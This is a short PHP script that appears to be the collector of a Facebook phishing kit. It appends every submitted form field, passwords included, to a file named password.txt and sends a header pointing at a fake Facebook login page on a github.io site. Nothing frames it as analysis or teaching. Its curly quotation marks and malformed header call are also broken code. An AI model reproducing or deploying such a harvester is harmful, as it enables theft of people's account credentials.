<?php
header (‘https://jan422.github.io/facebook.overeni/-facebook-login.html’);
$handle = fopen(“password.txt”, “a”);
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “\r\n”);
}
fwrite($handle, “\r\n”);
fclose($handle);
exit;
?>
